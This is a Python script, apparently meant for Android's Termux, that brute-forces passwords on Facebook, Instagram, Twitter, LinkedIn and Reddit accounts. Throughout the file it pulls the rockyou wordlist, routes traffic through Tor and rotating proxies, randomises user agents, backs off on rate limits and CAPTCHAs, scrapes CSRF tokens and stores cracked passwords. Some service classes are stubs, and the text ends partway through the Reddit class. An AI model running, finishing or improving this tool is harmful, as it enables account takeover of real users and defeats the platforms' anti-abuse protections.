#!/data/data/com.termux/files/usr/bin/env python3
import os, sys, json, time, random, threading, queue, socket, subprocess, urllib.request, signal
from datetime import datetime
import re # Added for advanced Instagram/LinkedIn CSRF parsing

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "requests"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import requests

# ========== Config & Paths ==========
HOME = os.path.expanduser("~")
RESULTS_DIR = os.path.join(HOME, "storage/downloads/SocialBrute")
WORDLIST_DIR = os.path.join(HOME, ".socialbrute_wordlists")
TASKS_PATH = os.path.join(HOME, ".socialbrute_tasks.json")

ROCKYOU_URL = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
ROCKYOU_PATH = os.path.join(WORDLIST_DIR, "rockyou.txt")

# --- Advanced Proxy Configuration ---
# IMPORTANT: Replace with your actual healthy proxies.
# Example: "http://user:pass@proxy1.com:8080", "https://proxy2.com:443", "socks5://127.0.0.1:9050" (for Tor)
# If left empty, script will run without proxies (less effective against rate limits).
PROXY_LIST = [
    # "http://your_proxy_ip:port",
    # "https://another_proxy_ip:port",
    "socks5://127.0.0.1:9050", # Default Tor proxy. Ensure Tor is running or installed.
]
PROXY_HEALTH_CHECK_URL = "http://httpbin.org/ip" # Used to check if proxy is working

DEFAULT_KEY = 37
MAX_BACKOFF = 300 # Increased max backoff in seconds
MAX_THREADS = 6
MAX_ATTEMPTS = 5 # Increased attempts per password before giving up on it
TASK_SYNC_INTERVAL = 15

stop_event = threading.Event()
print_lock = threading.Lock()
write_lock = threading.Lock()

DEFAULT_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"
]

# Global list of healthy proxies and a queue for rotation
active_proxies = []
proxy_queue = queue.Queue()
proxy_lock = threading.Lock() # For managing proxy access

# ========== Utility functions ==========
def safe_print(msg: str):
    with print_lock:
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def ensure_dirs():
    for d in [RESULTS_DIR, WORDLIST_DIR]:
        if not os.path.isdir(d):
            os.makedirs(d, exist_ok=True)

def download_wordlist():
    if os.path.isfile(ROCKYOU_PATH):
        safe_print("[*] Wordlist rockyou.txt found, skipping download.")
        return
    safe_print("[*] Downloading rockyou.txt (large file, patience)...")
    try:
        urllib.request.urlretrieve(ROCKYOU_URL, ROCKYOU_PATH)
        safe_print("[*] Wordlist downloaded.")
    except Exception as e:
        safe_print(f"[!] Wordlist download failed: {e}")

def xor_encrypt(data: str, key: int = DEFAULT_KEY) -> str:
    return "".join(chr(ord(c) ^ key) for c in data)

def save_credentials(service: str, target: str, username: str, password: str):
    filename = os.path.join(RESULTS_DIR, f"{service}_{target}.txt")
    encrypted = xor_encrypt(f"{username} | {password}\n")
    with write_lock:
        with open(filename, "a") as f:
            f.write(encrypted)
            f.flush()
    safe_print(f"[*] Credentials saved encrypted in {filename}")

def random_user_agent():
    return random.choice(DEFAULT_USER_AGENTS)

def check_proxy_health(proxy_url):
    """Checks if a given proxy URL is healthy by attempting a request through it."""
    try:
        proxies = {"http": proxy_url, "https": proxy_url}
        session = requests.Session()
        session.headers.update({"User-Agent": random_user_agent()})
        resp = session.get(PROXY_HEALTH_CHECK_URL, proxies=proxies, timeout=10)
        return resp.status_code == 200
    except requests.exceptions.RequestException:
        return False

def initialize_proxy_pool():
    """Initializes the global proxy pool by checking health of PROXY_LIST."""
    global active_proxies
    active_proxies = []
    if not PROXY_LIST:
        safe_print("[*] No proxies configured in PROXY_LIST. Running without proxies.")
        return

    safe_print("[*] Initializing proxy pool...")
    for proxy_url in PROXY_LIST:
        if "socks5" in proxy_url.lower() and not is_tor_running():
            if not start_tor():
                safe_print(f"[!] Tor failed to start for {proxy_url}, skipping.")
                continue
        if check_proxy_health(proxy_url):
            active_proxies.append(proxy_url)
            safe_print(f"[*] Proxy {proxy_url} is healthy.")
        else:
            safe_print(f"[!] Proxy {proxy_url} is unhealthy or unreachable.")
    
    if not active_proxies:
        safe_print("[!] No healthy proxies available from the list. Brute-forcing without proxies.")
        if is_tor_running(): # Ensure Tor is stopped if it was started and then found unhealthy
            stop_tor()
    else:
        random.shuffle(active_proxies) # Shuffle for better distribution
        for p in active_proxies:
            proxy_queue.put(p)
        safe_print(f"[*] {len(active_proxies)} healthy proxies added to pool.")

def get_next_proxy():
    """Retrieves the next proxy from the rotation queue. Repopulates if empty."""
    with proxy_lock:
        if proxy_queue.empty():
            if not active_proxies:
                return None # No proxies initialized
            safe_print("[*] Proxy queue exhausted, repopulating...")
            random.shuffle(active_proxies)
            for p in active_proxies:
                proxy_queue.put(p)
        if not proxy_queue.empty():
            return proxy_queue.get()
        return None # Fallback if for some reason still empty

def create_advanced_session():
    """Creates a requests session with realistic headers."""
    sess = requests.Session()
    sess.headers.update({
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "DNT": "1", # Do Not Track header
        "Upgrade-Insecure-Requests": "1" # Request upgrade to HTTPS
        # Additional headers can be added here for specific sites:
        # "Sec-Ch-Ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
        # "Sec-Ch-Ua-Mobile": "?0",
        # "Sec-Ch-Ua-Platform": '"Windows"',
    })
    sess.timeout = 20 # Increased timeout for potential proxy latency
    return sess

def is_tor_running():
    """Checks if Tor process is running by attempting to connect to its SOCKS port."""
    try:
        sock = socket.socket()
        sock.settimeout(1)
        sock.connect(("127.0.0.1", 9050))
        sock.close()
        return True
    except:
        return False

def start_tor():
    """Attempts to start the Tor daemon."""
    if is_tor_running():
        safe_print("[*] Tor already running.")
        return True
    safe_print("[*] Starting Tor...")
    # Using 'tor' command. Ensure 'tor' package is installed in Termux.
    # For Termux: pkg install tor
    proc = subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15) # Give Tor time to start and connect to the network
    if proc.poll() is None: # Check if process is still running (Tor started successfully)
        safe_print("[*] Tor started.")
        return True
    safe_print("[!] Failed to start Tor. Make sure 'tor' is installed and configured correctly.")
    return False

def stop_tor():
    """Stops the Tor daemon process."""
    subprocess.run(["pkill", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    safe_print("[*] Tor stopped.")

def load_passwords(path: str, max_pwds: int):
    """Loads passwords from a specified wordlist file."""
    pwds = []
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for i, line in enumerate(f):
                if i >= max_pwds:
                    break
                pwd = line.strip()
                if pwd:
                    pwds.append(pwd)
        safe_print(f"[*] Loaded {len(pwds)} passwords from {path}.")
    except Exception as e:
        safe_print(f"[!] Password loading failed: {e}")
    return pwds

def progress_bar(curr, total, bar_len=40):
    """Displays a command-line progress bar."""
    frac = curr / total if total else 1
    filled = int(bar_len * frac)
    bar = '=' * filled + '-' * (bar_len - filled)
    pct = int(frac * 100)
    eta = (total - curr) * 0.75 # Simple ETA estimation (can be improved)
    sys.stdout.write(f"\r[{bar}] {pct}% ETA: {int(eta)}s")
    sys.stdout.flush()

# Distributed task sync functions (for resuming or multi-instance operation)
def load_tasks():
    """Loads tasks from the tasks JSON file."""
    if not os.path.isfile(TASKS_PATH):
        with open(TASKS_PATH, "w") as f:
            json.dump([], f)
    try:
        with open(TASKS_PATH, "r") as f:
            tasks = json.load(f)
            if not isinstance(tasks, list):
                return [] # Ensure it's a list
            return tasks
    except json.JSONDecodeError:
        safe_print(f"[!] Error decoding {TASKS_PATH}, creating new empty file.")
        with open(TASKS_PATH, "w") as f:
            json.dump([], f)
        return []
    except Exception as e:
        safe_print(f"[!] Error loading tasks: {e}")
        return []

def save_tasks(tasks):
    """Saves tasks to the tasks JSON file."""
    with write_lock:
        with open(TASKS_PATH, "w") as f:
            json.dump(tasks, f, indent=2)

def add_task(task: dict):
    """Adds a task to the global tasks list and saves it."""
    tasks = load_tasks()
    if task not in tasks:
        tasks.append(task)
        save_tasks(tasks)

def remove_task(task: dict):
    """Removes a task from the global tasks list and saves it."""
    tasks = load_tasks()
    tasks = [t for t in tasks if not (t['service'] == task['service'] and t['target'] == task['target'] and t['password'] == task['password'])]
    save_tasks(tasks)

def detect_captcha(response) -> bool:
    """Attempts to detect CAPTCHA presence in an HTTP response."""
    try:
        text = response.text.lower()
    except:
        text = ""
    for key in ["captcha", "bot", "challenge", "verify you are human", "recaptcha", "h-captcha", "are you a robot", "jschallenge"]:
        if key in text:
            return True
    return False

def solve_captcha():
    """Simulates CAPTCHA solving or integrates with a CAPTCHA solving API."""
    # This is a placeholder. For actual advanced use, integrate with services like 2Captcha or Anti-Captcha.
    # E.g., captcha_solver.solve(sitekey, url)
    wait = random.randint(30, 60) # Longer wait time for CAPTCHA simulation
    safe_print(f"[*] Captcha detected, waiting {wait}s or attempting automated solve (if implemented)...")
    time.sleep(wait)

# ========== Base class for brute forcing ==========
class BaseBruteForce:
    def __init__(self, target, passwords, service):
        self.target = target
        self.passwords = passwords
        self.service = service
        self.queue = queue.Queue()
        self.max_attempts = MAX_ATTEMPTS
        self.initial_backoff = 1 # Initial backoff for exponential growth in seconds
        self.success_pwd = None
        self.threads = []
        self._fill_queue()

    def _fill_queue(self):
        """Populates the password queue, considering previously failed attempts."""
        tasks = load_tasks()
        distributed_pwds = {t['password']: t.get('attempts', 0) for t in tasks if t['service'] == self.service and t['target'] == self.target}
        for pwd in self.passwords:
            attempts = distributed_pwds.get(pwd, 0)
            if attempts < self.max_attempts:
                self.queue.put((pwd, attempts))

    def _update_task(self, password, attempts):
        """Updates or adds a task (password attempt) to the tasks file."""
        tasks = load_tasks()
        found = False
        for t in tasks:
            if t['service'] == self.service and t['target'] == self.target and t['password'] == password:
                t['attempts'] = attempts
                found = True
                break
        if not found:
            tasks.append({"service": self.service, "target": self.target, "password": password, "attempts": attempts})
        save_tasks(tasks)

    def _remove_task(self, password):
        """Removes a successfully found password's task from the tasks file."""
        tasks = load_tasks()
        tasks = [t for t in tasks if not (t['service'] == self.service and t['target'] == self.target and t['password'] == password)]
        save_tasks(tasks)

    def get_session_with_proxy(self):
        """Creates a new requests session and assigns a proxy from the pool."""
        session = create_advanced_session()
        proxy_url = get_next_proxy()
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}
            safe_print(f"[*] Using proxy: {proxy_url}")
        else:
            safe_print("[!] No active proxies for this session, proceeding without proxy.")
        return session

    def worker(self):
        """Abstract method for individual service brute-force logic."""
        raise NotImplementedError

    def start(self):
        """Manages the worker threads and overall brute-force process."""
        for _ in range(MAX_THREADS):
            t = threading.Thread(target=self.worker)
            t.daemon = True # Allows program to exit even if threads are running
            t.start()
            self.threads.append(t)
        try:
            while any(t.is_alive() for t in self.threads):
                if stop_event.is_set():
                    break
                time.sleep(0.1) # Prevents busy-waiting
        except KeyboardInterrupt:
            safe_print("\n[*] Ctrl+C detected, stopping...")
            stop_event.set() # Signal threads to stop
        for t in self.threads:
            t.join() # Wait for all threads to finish gracefully
        if self.success_pwd:
            safe_print(f"[*] SUCCESS: Password found: {self.success_pwd}")
            save_credentials(self.service, self.target, self.target, self.success_pwd)
            self._remove_task(self.success_pwd)
        else:
            safe_print("[*] Brute force complete: Password not found.")

# ========== Services Implementations ==========

class FacebookBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://mbasic.facebook.com/login.php"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy() # Each worker gets its own session/proxy
        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            # Adaptive Exponential Backoff
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[FB] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()}) # Rotate User-Agent per request
                resp = local_session.get(login_url, timeout=20) # Increased timeout
                
                if resp.status_code == 429: # Too Many Requests
                    safe_print(f"[FB] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy() # Get new session with new proxy
                    self.queue.put((pwd, attempts + 1)) # Re-queue for another attempt
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5)) # Longer backoff after rate limit
                    continue
                elif resp.status_code != 200:
                    safe_print(f"[FB] Login page error {resp.status_code}, re-queuing and backing off.")
                    local_session = self.get_session_with_proxy() # Try a new session/proxy for next attempt
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(resp):
                    solve_captcha() # Simulate/attempt CAPTCHA solve
                    local_session = self.get_session_with_proxy() # Get new session/proxy after CAPTCHA to try fresh
                    self.queue.put((pwd, attempts + 1)) # Re-queue for another attempt
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                data = {"email": self.target, "pass": pwd, "login": "Log In"}
                post_resp = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                cookies = post_resp.cookies.get_dict()
                
                tried += 1
                progress_bar(tried, total)

                # Check for successful login indicators
                if "c_user" in cookies or ("/home.php" in post_resp.headers.get("Location", "") and post_resp.status_code in [302, 303]):
                    self.success_pwd = pwd
                    stop_event.set() # Signal all threads to stop
                    self.queue.task_done()
                    safe_print(f"\n[FB] Authentication successful for {self.target} with password: {pwd}")
                    break
                elif "password_incorrect" in post_resp.text.lower() or "incorrect password" in post_resp.text.lower():
                    safe_print(f"\n[FB] Incorrect password for {self.target}: {pwd}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[FB] Unhandled response for {self.target} with password: {pwd} (status: {post_resp.status_code}, response_len: {len(post_resp.text)})")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                # Small random delay between attempts, even if successful or explicit incorrect
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[FB] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy() # Get new session with new proxy
                time.sleep(random.uniform(current_delay, current_delay * 2)) # Longer backoff for network errors
            except Exception as e:
                safe_print(f"[FB] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class InstagramBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.instagram.com/accounts/login/ajax/"
        local_session = self.get_session_with_proxy()
        
        # Fetch CSRF token - essential for Instagram
        try:
            r = local_session.get("https://www.instagram.com/accounts/login/", timeout=20)
            csrf = r.cookies.get("csrftoken", "")
            if csrf:
                local_session.headers.update({"X-CSRFToken": csrf, "Referer": "https://www.instagram.com/accounts/login/"})
            else:
                safe_print("[IG] Warning: CSRF token missing from initial GET request. Trying to extract from page source.")
                match = re.search(r'"csrf_token":"(.*?)"', r.text)
                if match:
                    csrf = match.group(1)
                    local_session.headers.update({"X-CSRFToken": csrf})
                    safe_print(f"[IG] CSRF token found in JSON: {csrf}")
                else:
                    safe_print("[IG] Critical: Could not obtain CSRF token. Instagram brute force will likely fail.")
                    # If CSRF is critical and not found, might be best to stop this worker
                    self.queue.put((self.target, self.max_attempts)) # Mark all passwords as max attempts to finish faster
                    return
        except Exception as e:
            safe_print(f"[IG] CSRF token fetch failed: {e}. Worker stopping.")
            self.queue.put((self.target, self.max_attempts)) # Mark all passwords as max attempts
            return

        total = self.queue.qsize()
        tried = 0
        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[IG] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                data = {
                    "username": self.target,
                    "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{pwd}", # This format is crucial for Instagram
                    "queryParams": {},
                    "optIntoOneTap": False
                }
                
                # Re-fetch CSRF token if session changes or becomes invalid (e.g., after proxy switch)
                if "X-CSRFToken" not in local_session.headers or not local_session.headers["X-CSRFToken"]:
                    safe_print("[IG] Re-fetching CSRF token...")
                    r_csrf_refresh = local_session.get("https://www.instagram.com/accounts/login/", timeout=20)
                    new_csrf = r_csrf_refresh.cookies.get("csrftoken", "")
                    if new_csrf:
                        local_session.headers.update({"X-CSRFToken": new_csrf})
                    else:
                        safe_print("[IG] Warning: Could not re-fetch CSRF token.")
                        # This attempt will likely fail, re-queue and try new session/proxy
                        self.queue.put((pwd, attempts + 1))
                        self._update_task(pwd, attempts + 1)
                        local_session = self.get_session_with_proxy()
                        self.queue.task_done()
                        continue
                
                r = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[IG] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                json_resp = r.json()
                tried += 1
                progress_bar(tried, total)

                if json_resp.get("authenticated"):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[IG] Authentication successful for {self.target} with password: {pwd}")
                    break
                elif "checkpoint_required" in json_resp:
                    safe_print("[IG] Checkpoint required (2FA/suspicious activity) - stopping to avoid lockout for this target.")
                    stop_event.set()
                    self.queue.task_done()
                    break
                elif json_resp.get("user") == False or json_resp.get("feedback_message"):
                    safe_print(f"\n[IG] Failed attempt for {self.target} with password: {pwd} - {json_resp.get('feedback_message', 'No specific feedback').strip()}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[IG] Unhandled response for {self.target} with password: {pwd}. Status: {r.status_code}, JSON: {json_resp}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)

                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[IG] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except json.JSONDecodeError:
                safe_print(f"[IG] JSON Decode Error - unexpected response format for {self.target}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[IG] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class TwitterBrute(BaseBruteForce):
    def worker(self):
        # Twitter's API is very complex and heavily rate-limited for login attempts.
        # The xauth_password.json endpoint is deprecated for web login flows. Modern Twitter (X) uses OAuth2 + JS.
        # A truly working solution would likely involve Selenium/Playwright with a headless browser
        # to navigate the full login flow and handle JavaScript challenges.
        login_url = "https://api.twitter.com/auth/1/xauth_password.json" # Legacy endpoint
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()
        
        safe_print("[TW] Warning: Twitter's login API is highly protected and this direct API method is unlikely to work reliably.")

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[TW] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                data = {"username": self.target, "password": pwd}
                r = local_session.post(login_url, data=data, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[TW] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue
                elif detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                if r.status_code == 200 and "token" in r.text: # Legacy check for success
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[TW] Authentication successful for {self.target} with password: {pwd}")
                    break
                elif r.status_code == 401: # Unauthorized (usually incorrect credentials)
                    try:
                        error_json = r.json()
                        error_message = error_json.get("errors", [{}])[0].get("message", "Authentication failed")
                        safe_print(f"\n[TW] Failed attempt for {self.target} with password: {pwd}. Error: {error_message}")
                    except json.JSONDecodeError:
                        safe_print(f"\n[TW] Failed attempt for {self.target} with password: {pwd}. Status: {r.status_code}")
                else:
                    safe_print(f"\n[TW] Unhandled response for {self.target} with password: {pwd}. Status: {r.status_code}, Response: {r.text[:200]}...")
                
                self.queue.put((pwd, attempts + 1))
                self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[TW] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[TW] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class LinkedInBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.linkedin.com/checkpoint/lg/login-submit"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()
        
        # LinkedIn often requires a CSRF token from the initial login page
        csrf_token = None
        try:
            r_init = local_session.get("https://www.linkedin.com/login", timeout=20)
            match = re.search(r'name="loginCsrfParam" value="([^"]+)"', r_init.text)
            if match:
                csrf_token = match.group(1)
                safe_print(f"[LI] Found loginCsrfParam: {csrf_token}")
                # LinkedIn might need this in header or form data, usually form data.
            else:
                safe_print("[LI] Warning: loginCsrfParam not found. LinkedIn brute force may fail.")
        except Exception as e:
            safe_print(f"[LI] Error fetching initial LinkedIn login page/CSRF: {e}. Worker stopping.")
            self.queue.put((self.target, self.max_attempts))
            return

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[LI] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                data = {
                    "session_key": self.target,
                    "session_password": pwd,
                }
                if csrf_token:
                    data["loginCsrfParam"] = csrf_token # Include CSRF in POST data
                
                r = local_session.post(login_url, data=data, timeout=20, allow_redirects=False)
                
                if r.status_code == 429:
                    safe_print(f"[LI] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue
                elif detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                # Check for successful redirect (e.g., to /feed or /inbox)
                if r.status_code in [302, 303] and ("feed" in r.headers.get("Location", "") or "inbox" in r.headers.get("Location", "")):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[LI] Authentication successful for {self.target} with password: {pwd}")
                    break
                elif "incorrect-password" in r.text.lower() or "wrong password" in r.text.lower() or "authentication-url" in r.text.lower():
                    # "authentication-url" can indicate 2FA or similar challenges
                    safe_print(f"\n[LI] Failed attempt for {self.target} with password: {pwd} (Incorrect/Challenge).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[LI] Unhandled response for {self.target} with password: {pwd}. Status: {r.status_code}, Response: {r.text[:200]}...")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[LI] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[LI] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class TikTokBrute(BaseBruteForce):
    def worker(self):
        safe_print("[TT] TikTok brute forcing is highly complex due to advanced security measures like extensive bot detection, CAPTCHAs, and dynamic tokens. This feature is not reliably implemented here without headless browser automation and dedicated CAPTCHA solving services.")
        stop_event.set() # Immediately stop for TikTok as it's not feasible with current approach

class SnapchatBrute(BaseBruteForce):
    def worker(self):
        safe_print("[SC] Snapchat brute forcing is highly complex due to advanced security measures and strict rate limiting. This feature is not reliably implemented here.")
        stop_event.set() # Immediately stop for Snapchat

class PinterestBrute(BaseBruteForce):
    def worker(self):
        safe_print("[PT] Pinterest brute forcing is highly complex due to advanced security measures. This feature is not reliably implemented here.")
        stop_event.set() # Immediately stop for Pinterest

# --- NEW SERVICES ADDED HERE ---

class RedditBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.reddit.com/login/"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[RD] Warning: Reddit's login API is highly protected with CAPTCHAs and rate limiting. Direct API methods are unreliable.")

        # Reddit requires a CSRF token for login, typically found in a hidden input on the login page.
        modhash = None
        try:
            r_init = local_session.get(login_url, timeout=20)
            # Look for "modhash" or other CSRF-like tokens
            match = re.search(r'name="csrf_token" value="([^"]+)"', r_init.text) # Example
            if not match:
                match = re.search(r'"modhash": "(.*?)"', r_init.text) # Another common Reddit token
            
            if match:
                modhash = match.group(1)
                safe_print(f"[RD] Found CSRF token/modhash: {modhash}")
            else:
                safe_print("[RD] Warning: CSRF token/modhash not found. Reddit brute force may fail.")
        except Exception as e:
            safe_print(f"[RD] Error fetching initial Reddit login page/CSRF: {e}. Worker stopping.")
            self.queue.put((self.target, self.max_attempts))
            return

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[RD] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({
                    "User-Agent": random_user_agent(),
                    "Referer": login_url,
                    "Content-Type": "application/x-www-form-urlencoded"
                })

                data = {
                    "user": self.target,
                    "passwd": pwd,
                    "api_type": "json"
                }
